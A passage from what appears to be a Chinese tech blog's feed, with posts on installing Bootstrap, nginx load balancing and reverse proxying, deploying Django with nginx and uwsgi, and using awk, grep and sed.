<h3 id="How-to-install-bootstrap"><a href="#How-to-install-bootstrap" class="headerlink" title="How to install bootstrap?"></a>How to install bootstrap?</h3><h4 id="（一）官网下载编译好的压缩包"><a href="#（一）官网下载编译好的压缩包" class="headerlink" title="（一）官网下载编译好的压缩包"></a>（一）官网下载编译好的压缩包</h4><p>官网：<a href="http://getbootstrap.com/" target="_blank" rel="external">http://getbootstrap.com/</a><br>找到下图位置，并下载压缩包，解压后获取css与js文件夹。<br><img src="/upload_image/20170823/1.png" alt=""></p>
<h4 id="（二）Github源码下载"><a href="#（二）Github源码下载" class="headerlink" title="（二）Github源码下载"></a>（二）Github源码下载</h4><p>Github：<a href="https://github.com/twbs/bootstrap" target="_blank" rel="external">https://github.com/twbs/bootstrap</a><br>说明一下，官方也可以直接下载源码，下载后获取dist里面的css与js文件夹；当然也可以自己编译，参照github上面的教程</p>
<h4 id="（三）使用cdn文件"><a href="#（三）使用cdn文件" class="headerlink" title="（三）使用cdn文件"></a>（三）使用cdn文件</h4><p>简单来说，使用bootstrap主要就是使用已经封装好的js与css文件，因此也可以不用下载，直接使用官方提供的cdn文件，将以下代码添加到html的head中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt;  </div><div class="line">&lt;script src=<span class="string">"https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">&lt;script src=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h3 id="How-to-use-bootstrap"><a href="#How-to-use-bootstrap" class="headerlink" title="How to use bootstrap?"></a>How to use bootstrap?</h3><p>具体使用手册可以参考：<br><a href="http://www.runoob.com/bootstrap/bootstrap-tutorial.html" target="_blank" rel="external">http://www.runoob.com/bootstrap/bootstrap-tutorial.html</a><br><a href="http://www.bootcss.com/" target="_blank" rel="external">http://www.bootcss.com/</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;head&gt;</div><div class="line">  &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt;  </div><div class="line">  &lt;script src=<span class="string">"https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">  &lt;script src=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;table class=<span class="string">"table table-striped"</span>&gt; </div><div class="line">&lt;tr&gt;</div><div class="line">&lt;th&gt;<span class="built_in">test</span>&lt;/th&gt;</div><div class="line">&lt;th&gt;<span class="built_in">test</span>&lt;/th&gt;</div><div class="line">&lt;th&gt;<span class="built_in">test</span>&lt;/th&gt;</div><div class="line">&lt;/tr&gt;</div><div class="line">&lt;tr&gt;</div><div class="line">&lt;td&gt;<span class="built_in">test</span>&lt;/td&gt;</div><div class="line">&lt;td&gt;<span class="built_in">test</span>&lt;/td&gt;</div><div class="line">&lt;td&gt;<span class="built_in">test</span>&lt;/td&gt;</div><div class="line">&lt;/tr&gt;</div><div class="line">&lt;/table&gt;</div><div class="line">    &lt;button <span class="built_in">type</span>=<span class="string">"button"</span> class=<span class="string">"btn btn-success"</span>&gt;成功按钮&lt;/button&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<p><img src="/upload_image/20170823/2.png" alt=""></p>
<p>说明：head中导入js与css，模版很多不过一般这三个就够用了，然后具体的标签中就可以使用class来加载css与js。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Let bygones be bygones&lt;br&gt;过去的就让它过去吧&lt;/blockquote&gt;&lt;br&gt;　　现在Web前端的技术发展得很快，web页面做得越来越炫目。然而作为一名”后端程序员”，不会写css，写不好javascript，不懂jquery怎么办？没关系，本篇将介绍前端开发神器–bootstrap，学会它立马变身前端达人。（题外话：我也是被前端开发搞得心力憔悴后，才发现有这个框架，用起来简直爽！）&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="bootstrap" scheme="http://thief.one/tags/bootstrap/"/>
    
  </entry>
  
  <entry>
    <title>nginx负载均衡</title>
    <link href="http://thief.one/2017/08/22/1/"/>
    <id>http://thief.one/2017/08/22/1/</id>
    <published>2017-08-22T06:08:36.000Z</published>
    <updated>2017-08-22T06:45:31.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Give more than you planned to<br>多多给予，不必计较</blockquote><br>　　nginx功能强大且常用作反向代理或者负载均衡，当我们部署了一个web系统之后，面对日益增多的访问流量，采用nginx做负载均衡是一个实惠的方案，本文用来记录nginx实现负载均衡的一些操作。<br><a id="more"></a></p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>　　为了能够更符合真实环境，我在本机host上绑定了一个域名phantomjs.me，其ip地址为192.168.1.2，是一台安装了nginx的linux服务器，用来模拟负载均衡服务器；另外同一内网中还有3台web服务器，其ip分别是192.168.1.3，192.168.1.4，192.168.1.5。</p>
<h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的　　"></a>实验目的　　</h3><p>　　当我们访问phantomjs.me域名时，负载均衡服务器能够将流量负载到3台web服务器中，负载的方式可以自由选择。</p>
<h3 id="方案设计"><a href="#方案设计" class="headerlink" title="方案设计"></a>方案设计</h3><ul>
<li>（A）192.168.1.2负载均衡服务器监听80端口，用作负载。</li>
<li>（B）192.168.1.3Web服务器监听80端口。</li>
<li>（C）192.168.1.4Web服务器监听80端口。</li>
<li>（D）192.168.1.5Web服务器监听80端口。</li>
</ul>
<p>说明：A服务器作为负载均衡服务器，域名直接解析到A服务器（192.168.1.2:80）上。由A服务器将流量负载均衡到B服务器（192.168.1.3:80）、C服务器（192.168.1.4:80）和D服务器（192.168.1.5:80）上。负载均衡可以针对不同的服务器，也可以针对同一台服务器的不同端口，主要看实际需求。</p>
<h3 id="nginx具体配置"><a href="#nginx具体配置" class="headerlink" title="nginx具体配置"></a>nginx具体配置</h3><p>　　编辑A服务器的nginx.conf，文件位置在nginx安装目录下，一般在/etc/nginx/nginx.conf。在http段加入以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">upstream server_pools&#123;</div><div class="line">      server 192.168.1.3:80; <span class="comment">#分别对应三台web服务器</span></div><div class="line">      server 192.168.1.4:80;</div><div class="line">      server 192.168.1.5:80;</div><div class="line">&#125;</div><div class="line"></div><div class="line">server&#123; </div><div class="line">    listen 80; <span class="comment">#nginx开启的端口</span></div><div class="line">    server_name phantoms.me; <span class="comment">#测试域名</span></div><div class="line">    location / &#123; </div><div class="line">        proxy_pass         http://phantomjs.me; </div><div class="line">        proxy_set_header   Host             <span class="variable">$host</span>; </div><div class="line">        proxy_set_header   X-Real-IP        <span class="variable">$remote_addr</span>; </div><div class="line">        proxy_set_header   X-Forwarded-For  <span class="variable">$proxy_add_x_forwarded_for</span>; </div><div class="line">    &#125; </div><div class="line">    access_log /var/<span class="built_in">log</span>/nginx.log;  <span class="comment">#添加日志记录</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>重启nginx<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/nginx restart</div></pre></td></tr></table></figure></p>
<p>最后访问<a href="http://phantomjs.me" target="_blank" rel="external">http://phantomjs.me</a></p>
<h4 id="server中可用的参数"><a href="#server中可用的参数" class="headerlink" title="server中可用的参数"></a>server中可用的参数</h4><p>默认upstream server后的参数 weight=1 max_fails=1 fail_timeout=10s。</p>
<ul>
<li>weight：服务器权重</li>
<li>max_fails=number:最大失败尝试次数</li>
<li>fail_timeout=time:设置服务器不可用的时长</li>
<li>backup：备用主机</li>
<li>down：手动标记不再处理任何用户请求</li>
</ul>
<h3 id="nginx反向代理"><a href="#nginx反向代理" class="headerlink" title="nginx反向代理"></a>nginx反向代理</h3><p>这里顺便记录一下，用nginx配置反向代理的方法，这种方法也被大量用在网页劫持（黑产）中，这里不详细介绍了。</p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>将以下内容添加到nginx配置文件的server中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">location /update/&#123;<span class="comment">#将本地update目录代理到baidu.com/update目录下，即访问本地update其实是在访问baidu的update。</span></div><div class="line">        proxy_pass         http://baidu.com/update; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>重启nginx，尝试访问<em><a href="http://phantomjs.me/update/" target="_blank" rel="external">http://phantomjs.me/update/</a></em>，其实际获取的是baidu的update目录资源。</p>
<p>关于nginx负载均衡更详细的内容，可以访问：<a href="http://www.jusene.me/2017/05/24/nginx-proxy/" target="_blank" rel="external">http://www.jusene.me/2017/05/24/nginx-proxy/</a></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://www.jianshu.com/p/ac8956f79206" target="_blank" rel="external">http://www.jianshu.com/p/ac8956f79206</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Give more than you planned to&lt;br&gt;多多给予，不必计较&lt;/blockquote&gt;&lt;br&gt;　　nginx功能强大且常用作反向代理或者负载均衡，当我们部署了一个web系统之后，面对日益增多的访问流量，采用nginx做负载均衡是一个实惠的方案，本文用来记录nginx实现负载均衡的一些操作。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>nginx+uwsgi部署Django</title>
    <link href="http://thief.one/2017/08/21/1/"/>
    <id>http://thief.one/2017/08/21/1/</id>
    <published>2017-08-21T12:31:59.000Z</published>
    <updated>2017-08-22T06:03:31.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Constant dropping wears the stone<br>滴水穿石</blockquote><br>　　本文用来记录Django部署的一些笔记，文中描述的系统环境为Ubuntu，采用的服务器为nginx以及用uwsgi来连接Django，这也是目前Django比较主流的部署套餐。<br><a id="more"></a></p>
<h3 id="部署连接原理"><a href="#部署连接原理" class="headerlink" title="部署连接原理"></a>部署连接原理</h3><p>浏览器发起web请求&lt;——&gt;nginx接收请求&lt;——&gt;uwsgi处理请求&lt;—–&gt;django程序</p>
<h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><h4 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h4><p>安装nginx<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install nginx</div></pre></td></tr></table></figure></p>
<p>运行并查看状态<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/nginx start</div><div class="line">/etc/init.d/nginx status</div></pre></td></tr></table></figure></p>
<h4 id="Uwsgi"><a href="#Uwsgi" class="headerlink" title="Uwsgi"></a>Uwsgi</h4><p>先安装python-dev，否则uwsgi安装可能会报错<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install python-dev</div></pre></td></tr></table></figure></p>
<p>安装uwsgi<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install uwsgi</div></pre></td></tr></table></figure></p>
<p>安装完后添加环境变量:<br>打开文件：sudo vim .bashrc，添加以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=/home/nmask/.<span class="built_in">local</span>/bin/:<span class="variable">$PATH</span></div></pre></td></tr></table></figure></p>
<p>然后运行source .bashrc使之生效，就可以在命令行直接运行uwsgi</p>
<h3 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h3><h4 id="测试nginx"><a href="#测试nginx" class="headerlink" title="测试nginx"></a>测试nginx</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/nginx start</div></pre></td></tr></table></figure>
<p>打开<em><a href="http://localhost:80" target="_blank" rel="external">http://localhost:80</a></em>，能看到nginx说明nginx安装成功。</p>
<h4 id="测试uwsgi"><a href="#测试uwsgi" class="headerlink" title="测试uwsgi"></a>测试uwsgi</h4><p>项目根目录下创建test.py文件，写入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def application(env, start_response):</div><div class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>,<span class="string">'text/html'</span>)])</div><div class="line">    <span class="built_in">return</span> <span class="string">"Hello World”</span></div></pre></td></tr></table></figure></p>
<p>项目根目录下运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uwsgi --http :8001 --wsgi-file test.py</div></pre></td></tr></table></figure></p>
<p>访问<em><a href="http://localhost:8001" target="_blank" rel="external">http://localhost:8001</a></em>，如果能看到hello world，说明uwsgi安装成功。</p>
<h5 id="利用uwsgi运行django项目"><a href="#利用uwsgi运行django项目" class="headerlink" title="利用uwsgi运行django项目"></a>利用uwsgi运行django项目</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uwsgi --http :8001 --<span class="built_in">chdir</span> /home/nmask/mydjango --wsgi-file mydjango/wsgi.py --master --processes 4 --threads 2 --stats 127.0.0.1:8080</div></pre></td></tr></table></figure>
<p>常用选项：</p>
<ul>
<li>http ： 协议类型和端口号</li>
<li>processes ： 开启的进程数量</li>
<li>workers ： 开启的进程数量，等同于processes（官网的说法是spawn the specified number ofworkers / processes）</li>
<li>chdir ： 指定运行目录（chdir to specified directory before apps loading）</li>
<li>wsgi-file ： 载入wsgi-file（load .wsgi file）</li>
<li>stats ： 在指定的地址上，开启状态服务（enable the stats server on the specified address）</li>
<li>threads ： 运行线程。由于GIL的存在，我觉得这个真心没啥用。（run each worker in prethreaded mode with the specified number of threads）</li>
<li>master ： 允许主进程存在（enable master process）</li>
<li>daemonize ： 使进程在后台运行，并将日志打到指定的日志文件或者udp服务器（daemonize uWSGI）。实际上最常用的，还是把运行记录输出到一个本地文件上。</li>
<li>pidfile ： 指定pid文件的位置，记录主进程的pid号。</li>
<li>vacuum ： 当服务器退出的时候自动清理环境，删除unix socket文件和pid文件（try to remove all of the generated file/sockets）</li>
</ul>
<h3 id="文件配置"><a href="#文件配置" class="headerlink" title="文件配置"></a>文件配置</h3><h4 id="myweb-uwsgi-ini"><a href="#myweb-uwsgi-ini" class="headerlink" title="myweb_uwsgi.ini"></a>myweb_uwsgi.ini</h4><p>项目根目录下创建：myweb_uwsgi.ini文件，写入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># myweb_uwsgi.ini file</span></div><div class="line">[uwsgi]</div><div class="line"></div><div class="line"><span class="comment"># Django-related settings</span></div><div class="line"></div><div class="line">socket = :8000</div><div class="line"></div><div class="line"><span class="comment"># the base directory (full path)</span></div><div class="line"><span class="built_in">chdir</span>           = /home/nmask/mydjango</div><div class="line"><span class="comment"># Django s wsgi file</span></div><div class="line">module          = mydjango.wsgi</div><div class="line"></div><div class="line"><span class="comment"># process-related settings</span></div><div class="line"><span class="comment"># master</span></div><div class="line">master          = <span class="literal">true</span></div><div class="line"></div><div class="line"><span class="comment"># maximum number of worker processes</span></div><div class="line">processes       = 4</div><div class="line"></div><div class="line"><span class="comment"># ... with appropriate permissions - may be needed</span></div><div class="line"><span class="comment"># chmod-socket    = 664</span></div><div class="line"><span class="comment"># clear environment on exit</span></div><div class="line">vacuum          = <span class="literal">true</span></div></pre></td></tr></table></figure></p>
<p>利用uwsgi运行django：（与前面命令行的方式一样，这样为了方便写成了文件）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uwsgi --ini myweb_uwsgi.ini</div></pre></td></tr></table></figure></p>
<p>配置文件参数：</p>
<ul>
<li>socket:指uwsgi运行的端口</li>
<li>Chdir:运行的目录</li>
<li>Module：运行的文件</li>
</ul>
<h4 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h4><p>打开/etc/nginx/nginx.conf，http内添加以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">    listen         8890; </div><div class="line">    server_name    127.0.0.1 </div><div class="line">    charset UTF-8;</div><div class="line">    access_log      /var/<span class="built_in">log</span>/nginx/myweb_access.log;</div><div class="line">    error_log       /var/<span class="built_in">log</span>/nginx/myweb_error.log;</div><div class="line"></div><div class="line">    client_max_body_size 75M;</div><div class="line"></div><div class="line">    location / &#123; </div><div class="line">        include uwsgi_params;</div><div class="line">        uwsgi_pass 127.0.0.1:8000;</div><div class="line">        uwsgi_read_timeout 2;</div><div class="line">    &#125;   </div><div class="line">    location /static &#123;</div><div class="line">        expires 30d;</div><div class="line">        autoindex on; </div><div class="line">        add_header Cache-Control private;</div><div class="line">        <span class="built_in">alias</span> /home/fnngj/pydj/myweb/static/;</div><div class="line">     &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p>说明：这里的8000端口是uwsgi的端口，nginx运行将开启8890端口，也就是nginx的8890端口与uwsgi的8000端口相互通信。</p>
<h3 id="部署运行"><a href="#部署运行" class="headerlink" title="部署运行"></a>部署运行</h3><p>运行uwsgi：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nohup uwsgi --ini myweb_uwsgi.ini &amp;</div></pre></td></tr></table></figure></p>
<p>运行nginx:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/nginx start</div></pre></td></tr></table></figure></p>
<p>最后访问<em><a href="http://localhost:8890" target="_blank" rel="external">http://localhost:8890</a></em>，可以看到django项目已经被运行在nginx上了。</p>
<p>注意：<em>在更新Django代码后，最好重启一下uwsgi进程，避免出现不可预知的Bug！</em></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://www.cnblogs.com/fnng/p/5268633.html" target="_blank" rel="external">http://www.cnblogs.com/fnng/p/5268633.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Constant dropping wears the stone&lt;br&gt;滴水穿石&lt;/blockquote&gt;&lt;br&gt;　　本文用来记录Django部署的一些笔记，文中描述的系统环境为Ubuntu，采用的服务器为nginx以及用uwsgi来连接Django，这也是目前Django比较主流的部署套餐。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="nginx" scheme="http://thief.one/tags/nginx/"/>
    
      <category term="Django" scheme="http://thief.one/tags/Django/"/>
    
  </entry>
  
  <entry>
    <title>【玩转linux系列】awk、grep、sed</title>
    <link href="http://thief.one/2017/08/12/1/"/>
    <id>http://thief.one/2017/08/12/1/</id>
    <published>2017-08-12T02:41:19.000Z</published>
    <updated>2017-09-01T11:25:37.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Learn and live<br>活着，为了学习<br></blockquote><br>　　awk、grep、sed是linux操作文本的三大利器，也是必须掌握的linux命令之一。三者的功能都是处理文本，但侧重点各不相同，其中属awk功能最强大，但也最复杂。grep更适合单纯的查找或匹配文本，sed更适合编辑匹配到的文本，awk更适合格式化文本，对文本进行较复杂格式处理。<br><a id="more"></a><br>以下所有实验输出，均以测试文件test.log内容为基准：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">20170102 admin,password Open</div><div class="line">20170801 nmask,nmask close</div><div class="line">20180902 nm4k,<span class="built_in">test</span> filter</div></pre></td></tr></table></figure></p>
<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>AWK是一种处理文本文件的语言，是一个强大的文本分析工具;awk是以列为划分计数的，$0表示所有列，$1表示第一列，$2表示第二列。</p>
<h4 id="awk参数"><a href="#awk参数" class="headerlink" title="awk参数"></a>awk参数</h4><ul>
<li>-F 指定输入文件折分隔符，如-F:</li>
<li>-v 赋值一个用户定义变量，如-va=1</li>
<li>-f 从脚本文件中读取awk命令</li>
</ul>
<p>注：只列举最常用的参数</p>
<h4 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h4><p>每行按空格分割列，并输出第1、4列<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ awk <span class="string">'&#123;print $1,$4&#125;'</span> test.log</div><div class="line">或者</div><div class="line">$ cat test.log | awk <span class="string">'&#123;print $1,$4&#125;'</span></div></pre></td></tr></table></figure></p>
<h4 id="自定义分隔符"><a href="#自定义分隔符" class="headerlink" title="自定义分隔符"></a>自定义分隔符</h4><p>使用”,”进行分割，参数用-F<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk -F, <span class="string">'&#123;print $1,$2&#125;'</span> test.log</div></pre></td></tr></table></figure></p>
<p>使用多个分隔符，先使用空格分割，然后对分割结果再使用”,”分割<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ awk -F <span class="string">'[ ,]'</span>  <span class="string">'&#123;print $1,$2,$3&#125;'</span>  test.log  <span class="comment">#注意逗号前面有一个空格</span></div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170812/1.png" alt=""></p>
<h4 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h4><p>设置awk自定义变量，用参数-v<br>例子：设置变量a为1<br><img src="/upload_image/20170812/2.png" alt=""><br>注意：-v a之间要空格。</p>
<p>字符串拼接：（用””而不是+）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat test.txt | awk -v a=\<span class="string">" '&#123;print a"</span><span class="string">"<span class="variable">$0</span>"</span><span class="string">"a&#125;'</span></div></pre></td></tr></table></figure></p>
<h4 id="逻辑判断"><a href="#逻辑判断" class="headerlink" title="逻辑判断"></a>逻辑判断</h4><p>输出第一列为20170801的记录<br><img src="/upload_image/20170812/3.png" alt=""></p>
<p>输出第二列不是nmask,nmask的记录<br><img src="/upload_image/20170812/4.png" alt=""></p>
<h4 id="内建变量"><a href="#内建变量" class="headerlink" title="内建变量"></a>内建变量</h4><p>NR参数：输出行号<br><img src="/upload_image/20170812/5.png" alt=""></p>
<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>输出第二列中包含nm开头的所有记录<br><img src="/upload_image/20170812/6.png" alt=""><br>输出包含2017开头的记录<br><img src="/upload_image/20170812/7.png" alt=""><br>注意：这里没有～，因为没有指定是哪一列</p>
<p>忽略大小写{INGORECASE=1}<br><img src="/upload_image/20170812/8.png" alt=""><br>匹配取反 !~<br><img src="/upload_image/20170812/9.png" alt=""></p>
<h4 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h4><h5 id="substr字符串截取"><a href="#substr字符串截取" class="headerlink" title="substr字符串截取"></a>substr字符串截取</h5><p>截取第一列的第一到第四个字符<br><img src="/upload_image/20170812/10.png" alt=""></p>
<h5 id="split切分字符串"><a href="#split切分字符串" class="headerlink" title="split切分字符串"></a>split切分字符串</h5><p>以逗号分隔第2列的数据，并输出分别输出第2列的内容<br><img src="/upload_image/20170812/11.png" alt=""></p>
<h5 id="gsub替换"><a href="#gsub替换" class="headerlink" title="gsub替换"></a>gsub替换</h5><p>将第2列中的nmask替换成nMask<br><img src="/upload_image/20170812/12.png" alt=""></p>
<h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>Linux grep命令用于查找文件里符合条件的字符串。</p>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><p>递归查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep -r nmask /etc/  <span class="comment">#查看/etc目录下内容包含nmask的文件</span></div></pre></td></tr></table></figure></p>
<p>查询取反<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep -v <span class="built_in">test</span>  test.log</div></pre></td></tr></table></figure></p>
<h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><p>Linux sed命令是利用script来处理文本文件。</p>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>-e 以选项中指定的script来处理输入的文本文件。<br>-f 以选项中指定的script文件来处理输入的文本文件。<br>-h 显示帮助。<br>-n 仅显示script处理后的结果。<br>-V 显示版本信息。</p>
<h4 id="动作"><a href="#动作" class="headerlink" title="动作"></a>动作</h4><p>a ：新增， a 的后面可以接字串，而这些字串会在下一行出现<br>i ：插入， i 的后面可以接字串，而这些字串会在上一行出现<br>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行<br>d ：删除<br>s ：取代，通常这个s的动作可以搭配正规表示法！如 s/old/new/g</p>
<h4 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h4><p>在test.log文件的第4行后插入一行，内容为nmask<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sed -e 4a\nmask test.log</div></pre></td></tr></table></figure></p>
<h4 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h4><p>删除test.log的第2行、第3行数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat test.log | sed <span class="string">'2,3d'</span></div></pre></td></tr></table></figure></p>
<p>匹配删除，删除行中有nmask字符串的<br><img src="/upload_image/20170812/13.png" alt=""></p>
<h4 id="替换操作"><a href="#替换操作" class="headerlink" title="替换操作"></a>替换操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sed <span class="string">'s/要被取代的字串/新的字串/g'</span></div></pre></td></tr></table></figure>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://www.runoob.com/linux/linux-comm-awk.html" target="_blank" rel="external">http://www.runoob.com/linux/linux-comm-awk.html</a></p>
]]></content>
    
    <summary type="html">
    
